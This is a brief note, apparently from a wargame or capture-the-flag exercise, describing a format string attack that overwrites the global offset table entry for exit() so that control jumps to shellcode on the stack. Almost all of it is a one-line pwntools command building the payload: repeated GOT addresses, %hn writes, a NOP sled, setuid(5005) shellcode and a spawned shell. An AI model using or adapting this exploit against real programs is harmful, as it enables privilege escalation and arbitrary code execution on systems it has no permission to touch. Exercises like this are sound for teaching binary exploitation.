#got #format string - overwrite the global offset table where the offset for the exit() function is with our shellcode location on the stack. 


./exploit `python -c "from pwn import *; print '\x14\xa0\x04\x08'*(56) + '\x16\xa0\x04\x08'*(56) + 'S'*29456 + '%110\\$hn' +'B'*35631 + '%180\\$hn' + '\x90'*1024*8 + asm(shellcraft.setuid(5005)) + asm(shellcraft.sh())  + 'a'*23"`
